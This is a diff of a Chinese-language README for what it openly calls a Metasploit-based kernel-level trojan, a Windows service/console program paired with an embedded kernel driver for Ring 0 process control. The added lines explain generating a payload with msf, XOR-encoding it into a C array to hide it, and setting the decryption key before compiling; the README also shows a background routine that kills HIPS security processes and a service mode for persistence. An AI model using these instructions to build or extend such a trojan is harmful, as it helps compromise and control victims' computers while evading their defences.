@@ -1,11 +1,11 @@
-# main_dual_new
+# 一个基于Metasploit-framework内核级木马
 
-双模式 Windows 服务/应用程序，结合内核驱动实现 Ring 0 级进程控制。
+Windows 服务/应用程序双模式，结合内核驱动实现 Ring 0 级进程控制。
 
 ## 架构概览
 
 ```
-main_dual_new.exe
+main.exe
 ├─ 应用模式 (--console)    手动运行，带控制台输出
 └─ 服务模式 (SCM 管理)     作为 Windows 服务持久运行
 
@@ -56,10 +56,15 @@ main_dual_new.exe
 - MinGW-w64 GCC
 - Windows SDK（advapi32, wtsapi32, userenv）
 
+### 编译前准备
+- 通过msf生成二进制程序文件
+- 将二进制程序文件编译为C语言数组并进行XOR运算后存入kPayload数组中
+- 将XOR 解密密钥写入代码第314行
+
 ### 编译命令
 
 ```bash
-gcc main_dual_new.c -o main_dual_new.exe \
+gcc main.c -o main.exe \
     -mwindows \
     -ladvapi32 -lwtsapi32 -luserenv
 ```
@@ -70,7 +75,7 @@ gcc main_dual_new.c -o main_dual_new.exe \
 
 ### 应用模式
 ```cmd
-main_dual_new.exe --console
+main.exe --console
 ```
 
 ### 服务模式
@@ -100,7 +105,7 @@ StartBackgroundKiller("Hips,notepad,calc");
 
 | 文件 | 说明 |
 |------|------|
-| `main_dual_new.c` | 主程序源码（单文件） |
+| `main.c` | 主程序源码（单文件） |
 | `driver_data.h` | Sirius.sys 编译时嵌入的字节数组 |
 | `resource.h` | 资源定义头文件 |
 | `Assets/Sirius.sys` | 内核驱动原始文件 |
